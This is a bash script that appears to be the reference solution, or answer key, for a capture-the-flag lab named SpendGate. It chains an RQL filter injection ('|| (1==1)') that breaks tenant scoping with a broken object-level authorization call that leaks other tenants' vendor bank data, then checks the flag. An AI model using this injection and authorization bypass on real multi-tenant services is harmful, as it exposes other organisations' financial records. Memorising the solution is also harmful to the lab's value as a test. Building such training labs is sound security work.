#!/usr/bin/env bash
# ============================================================
# SpendGate (labs19) — reference solution: multi-tenant chain
# (RQL scope bypass -> vendor BOLA -> bank data)
#
# Chain: self-register into Acme Corp -> the find_paginated
# endpoint prepends the tenant scope without wrapping
# parentheses, so a top-level OR in rql_condition breaks tenant
# scoping and lists Globex vendors -> the bill-payment endpoint
# never checks the vendor's company, so a cross-tenant vendorId
# returns the full bank object. The flag is the target vendor's
# plaintext_routing_number.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8099)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8099}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
email="test-$(date +%s)-$RANDOM@arena.local"

echo "[*] self-registering into Acme Corp" >&2
TOKEN="$(curl -fsS -X POST "$BASE/auth/register" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$email\",\"password\":\"test123\",\"name\":\"Test Agent\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')"
[[ -n "$TOKEN" ]] || { echo "[-] failed: registration returned no token" >&2; exit 1; }

echo "[*] RQL injection: top-level OR breaks the tenant scope" >&2
BODY="$(python3 -c 'import json; print(json.dumps({"rql_condition": "(id == '\''zzz'\'') || (1==1)"}))')"
RESP="$(curl -fsS -X POST "$BASE/api/vendors/find_paginated" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d "$BODY")"
echo "[*] vendor listing leaked $(python3 -c 'import sys,json; print(json.load(sys.stdin)["total"])' <<<"$RESP") records across tenants" >&2

echo "[*] probing the cross-tenant vendors on the bill-payment endpoint (BOLA)" >&2
flag=""
for vid in $(python3 -c 'import sys,json; print("\n".join(i["id"] for i in json.load(sys.stdin)["items"] if i["org"] != "org_acme"))' <<<"$RESP"); do
  PAY="$(curl -fsS "$BASE/api/bills/get_most_recently_approved_bill_payment_for_vendor?vendorId=$vid" \
    -H "Authorization: Bearer $TOKEN")"
  flag="$(grep -Eo "$FLAG_RE" <<<"$PAY" | head -n1 || true)"
  [[ -n "$flag" ]] && { echo "[*] flag found in vendor $vid bank object" >&2; break; }
done

if [[ -z "${flag:-}" ]]; then
  echo "[-] failed: no flag in any cross-tenant vendor payment" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
